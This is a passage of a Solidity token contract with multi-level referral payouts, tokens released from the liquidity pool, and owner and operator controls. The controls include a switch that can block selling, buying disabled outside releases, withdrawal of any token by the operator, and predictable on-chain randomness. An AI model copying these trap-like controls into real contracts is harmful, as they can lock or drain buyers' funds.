        uint256 contractBalance = address(this).balance;
        uint256 transferAmount = contractBalance < feeAmount ? contractBalance : feeAmount;
        require(transferAmount > 0, "No token to distribute");
        uint256[11] memory rates = [uint256(10), 2, 2, 2, 2, 2, 2, 2, 2, 2, 2];
        address cur = sender;
        uint256 totalDistributed = 0;
        for (uint256 i = 0; i < 11; i++) {
            address sup = superior[cur];
            if (sup == address(0)) break;
            if ((i == 0 || validCount[sup] >= 3) && (isValidUser[sup] || userReceivedBNB[sup] >= 0.1 ether)) {
                uint256 rewardAmount = feeAmount * rates[i] / 30;
                if (rewardAmount > 0) {
                    (bool ok, ) = sup.call{value: rewardAmount}("");
                    emit FeeRecord(sup, rewardAmount);
                    require(ok, "Fee transfer failed");
                    totalDistributed += rewardAmount;
                }
            }
            cur = sup;
        }
        uint256 leftAmount = transferAmount - totalDistributed;
        if (leftAmount > 0) {
            (bool ok, ) = rewardAddress.call{value: leftAmount}("");
            emit FeeRecord(rewardAddress, leftAmount);
            require(ok, "Fee transfer failed");
        }
    }

    function _transfer(address from, address recipient, uint256 amount) internal override {
        _bindSuperior(from, recipient, amount);
        if (isExcludedFromFee[from] || isExcludedFromFee[recipient]) {
            super._transfer(from, recipient, amount);
            return;
        }
        if (!isReleasing && ((dividendRounds.length > 0 && !dividendRounds[dividendRounds.length-1].finished) || block.timestamp >= lastReleaseTime + releaseDuration)) {
            _settleRelease();
        }
        if (from == liquidityPool) {
            bool isRemove;
            uint256 removeLPLiquidity = _isRemoveLiquidity(amount);
            if (removeLPLiquidity > 0) {
                isRemove = true;
            }
            if (isRemove) {
                _removeLp(recipient);
                super._transfer(from, recipient, amount);
                return;
            } else {
                if (!isReleasing) {
                    revert("Buying is disabled");
                }
            }
        }
        uint256 minAmount = 1e13;
        if (recipient == liquidityPool) {
            require(canSell, "Selling is disabled");
            uint256 feeAmount = amount * 5 / 100;
            super._transfer(from, feeReceiver, feeAmount);
            super._transfer(from, from, minAmount);
            uint256 transferAmount = amount - feeAmount - minAmount;
            super._transfer(from, recipient, transferAmount);
            return;
        }
        super._transfer(from, from, minAmount);
        uint256 leftAmount = amount - minAmount;
        super._transfer(from, recipient, leftAmount);
    }

    function _bindSuperior(address from, address to, uint256 amount) internal {
        if (from != to) {
            if (!transferIntent[from][to]) {
                transferIntent[from][to] = true;
            }
            if (transferIntent[to][from]) {
                if (superior[from] == address(0) && amount == 1 ether) {
                    superior[from] = to;
                }
                emit SuperiorBound(from, to);
            }
        }
    }

    function getSuperior(address user) external view returns (address) {
        return superior[user];
    }

    function _isRemoveLiquidity(uint256 amount) internal view returns (uint256) {
        (uint256 rOther, ) = _getReserves();
        uint256 balanceOther = IERC20(WBNB_ADDRESS).balanceOf(liquidityPool);
        if (balanceOther <= rOther) {
            uint256 liquidity = (amount * IUniswapPair(liquidityPool).totalSupply()) / (balanceOf(liquidityPool) - amount);
            return liquidity;
        }
        return 0;
    }

    function _removeLp(address user) internal {
        require(user != address(0), "Invalid user");
        userReceivedBNB[user] = 0;
        address sup = superior[user];
        if (isValidUser[user] && sup != address(0) && validCount[sup] > 0) {
            validCount[sup] -= 1;
        }
        isValidUser[user] = false;
        lpHolderAmount[user] = 0;
        uint256 idx = lpHolderIndex[user];
        if (idx > 0) {
            uint256 index = idx - 1;
            uint256 lastIndex = lpHolderList.length - 1;
            if (index != lastIndex) {
                address lastHolder = lpHolderList[lastIndex];
                lpHolderList[index] = lastHolder;
                lpHolderIndex[lastHolder] = idx;
            }
            lpHolderList.pop();
            lpHolderIndex[user] = 0;
        }
    }

    function removeLP(address user) external onlyAdmin {
        _removeLp(user);
    }

    function _getReserves() internal view returns (uint256 rOther, uint256 rThis) {
        (uint256 r0, uint256 r1, ) = IUniswapPair(liquidityPool).getReserves();
        if (WBNB_ADDRESS < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
    }

    function _getBnbPrice() internal view returns (uint256) {
        address pair = IUniswapFactory(FACTORY_ADDRESS).getPair(WBNB_ADDRESS, USDT_ADDRESS);
        require(pair != address(0), "Pair does not exist");
        (uint112 r0, uint112 r1, ) = IUniswapPair(pair).getReserves();
        address token0 = IUniswapPair(pair).token0();
        uint256 price = 0;
        if (token0 == WBNB_ADDRESS) {
            price = (uint256(r1) * 1e18) / uint256(r0);
        } else {
            price = (uint256(r0) * 1e18) / uint256(r1);
        }
        return price;
    }

    function getCurrentConfig() public returns (ReleaseLpConfig memory) {
        uint256 price = _getBnbPrice();
        (uint256 rOther, ) = _getReserves();
        uint256 value = price / 1e18 * rOther / 1e18;
        if (releaseLpStage == 0) {
            if (value >= releaseLpConfigs[2].poolBnbValue) {
                releaseLpStage = 2;
                return releaseLpConfigs[2];
            } else if (value >= releaseLpConfigs[1].poolBnbValue) {
                releaseLpStage = 1;
                return releaseLpConfigs[1];
            }
            return releaseLpConfigs[0];
        } else if (releaseLpStage == 1) {
            if (value >= releaseLpConfigs[2].poolBnbValue) {
                releaseLpStage = 2;
                return releaseLpConfigs[2];
            }
            return releaseLpConfigs[1];
        } else if (releaseLpStage == 2) {
            return releaseLpConfigs[2];
        }
        return releaseLpConfigs[0];
    }

    function _settleRelease() internal {
        isReleasing = true;
        do {
            ReleaseLpConfig memory cfg = getCurrentConfig();
            uint256 poolBalance = balanceOf(liquidityPool);
            if (dividendRounds.length == 0 || dividendRounds[dividendRounds.length-1].finished) {
                if (block.timestamp < lastReleaseTime + releaseDuration) break;
                if (poolBalance == 0) break;
                uint256 totalAmount = poolBalance * cfg.totalPercent * 24 / 100000;
                uint256 burnAmount = totalAmount * cfg.burnPercent / cfg.totalPercent;
                uint256 lpAmount = totalAmount - burnAmount;
                if (block.timestamp <= startTimestamp + 72 hours) {
                    uint256 feeAmount = lpAmount * 5 / 100;
                    if (feeAmount > 0) {
                        address releaseFeeReceiver1 = _getReleaseLpRandomAddress(1);
                        if (releaseFeeReceiver1 != address(0)) {
                            super._transfer(liquidityPool, releaseFeeReceiver1, feeAmount);
                            IUniswapPair(liquidityPool).sync();
                        }
                        address releaseFeeReceiver2 = _getReleaseLpRandomAddress(2);
                        if (releaseFeeReceiver2 != address(0)) {
                            super._transfer(liquidityPool, releaseFeeReceiver2, feeAmount);
                            IUniswapPair(liquidityPool).sync();
                        }
                    }
                    lpAmount = lpAmount - feeAmount * 2;
                }
                if (burnAmount > 0) {
                    super._transfer(liquidityPool, BURN_ADDRESS, burnAmount);
                    IUniswapPair(liquidityPool).sync();
                }
                if (lpAmount > 0 && lpHolderList.length > 0) {
                    dividendRounds.push(DividendRound({
                        startTime: block.timestamp,
                        totalAmount: totalAmount,
                        lpAmount: lpAmount,
                        processedIndex: 0,
                        finished: false
                    }));
                    lastReleaseTime = block.timestamp;
                } else {
                    break;
                }
            }
            if (dividendRounds.length > 0) {
                DividendRound storage round = dividendRounds[dividendRounds.length-1];
                if (!round.finished && lpHolderList.length > 0 && round.lpAmount > 0) {
                    uint256 totalLP = 0;
                    for (uint256 i = 0; i < lpHolderList.length; i++) totalLP += lpHolderAmount[lpHolderList[i]];
                    uint256 processed = 0;
                    for (; round.processedIndex < lpHolderList.length && processed < MAX_BATCH; round.processedIndex++) {
                        address holder = lpHolderList[round.processedIndex];
                        uint256 share = lpHolderAmount[holder] * round.lpAmount / totalLP;
                        if (share > 0) super._transfer(liquidityPool, holder, share);
                        processed++;
                    }
                    if (round.processedIndex >= lpHolderList.length) {
                        round.finished = true;
                    }
                }
                IUniswapPair(liquidityPool).sync();
            }
        } while(false);
        isReleasing = false;
    }

    function resetStatus() external onlyAdmin {
        isReleasing = false;
    }

    function recordLP(address holder, uint256 amount) external {
        require(msg.sender == proxyContract, "Only proxy can call");
        if (lpHolderAmount[holder] == 0) {
            lpHolderList.push(holder);
            lpHolderIndex[holder] = lpHolderList.length;
        }
        lpHolderAmount[holder] += amount;
    }

    function setProxyContract(address _proxy) external onlyOwner {
        proxyContract = _proxy;
    }

    function excludeFromFee(address account, bool excluded) external onlyOwner {
        isExcludedFromFee[account] = excluded;
    }

    function isAddressExcludedFromFee(address account) external view returns (bool) {
        return isExcludedFromFee[account];
    }

    function addReleaseLpAddress(address receiver, uint256 group) external onlyOwner {
        require(receiver != address(0), "Zero address");
        if (group == 1) {
            require(releaseLpFeeIndexMap1[receiver] == 0, "Already exists");
            releaseLpFeeReceiver1.push(receiver);
            releaseLpFeeIndexMap1[receiver] = releaseLpFeeReceiver1.length;
        } else if (group == 2) {
            require(releaseLpFeeIndexMap2[receiver] == 0, "Already exists");
            releaseLpFeeReceiver2.push(receiver);
            releaseLpFeeIndexMap2[receiver] = releaseLpFeeReceiver2.length;
        }
    }

    function removeReleaseLpAddress(address receiver, uint256 group) external onlyOwner {
        if (group == 1) {
            uint256 index = releaseLpFeeIndexMap1[receiver];
            require(index > 0, "Address not found");
            uint256 i = index - 1;
            uint256 lastIndex = releaseLpFeeReceiver1.length - 1;
            address lastAddr = releaseLpFeeReceiver1[lastIndex];
            releaseLpFeeReceiver1[i] = lastAddr;
            releaseLpFeeIndexMap1[lastAddr] = i + 1;
            releaseLpFeeReceiver1.pop();
            delete releaseLpFeeIndexMap1[receiver];
        } else if (group == 2) {
            uint256 index = releaseLpFeeIndexMap2[receiver];
            require(index > 0, "Address not found");
            uint256 i = index - 1;
            uint256 lastIndex = releaseLpFeeReceiver2.length - 1;
            address lastAddr = releaseLpFeeReceiver2[lastIndex];
            releaseLpFeeReceiver2[i] = lastAddr;
            releaseLpFeeIndexMap2[lastAddr] = i + 1;
            releaseLpFeeReceiver2.pop();
            delete releaseLpFeeIndexMap2[receiver];
        }
    }

    function getReleaseLpAddressCount(uint256 group) external view returns (uint256) {
        if (group == 1) {
            return releaseLpFeeReceiver1.length;
        } else if (group == 2) {
            return releaseLpFeeReceiver2.length;
        }
        return 0;
    }

    function _getReleaseLpRandomAddress(uint256 group) internal view returns (address) {
        uint256 rand = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender)));
        if (group == 1) {
            if (releaseLpFeeReceiver1.length > 0) {
                uint256 index = rand % releaseLpFeeReceiver1.length;
                return releaseLpFeeReceiver1[index];
            }
        } else if (group == 2) {
            if (releaseLpFeeReceiver2.length > 0) {
                uint256 index = rand % releaseLpFeeReceiver2.length;
                return releaseLpFeeReceiver2[index];
            }
        }
        return address(0);
    }

    function transferToken(address token, address recipient, uint256 amount) external {
        require(msg.sender == operatorAddress, "Not the operator");
        IERC20(token).transfer(recipient, amount);
    }

    function setAdminAddress(address _address) external onlyOwner {
        adminAddress = _address;
    }

}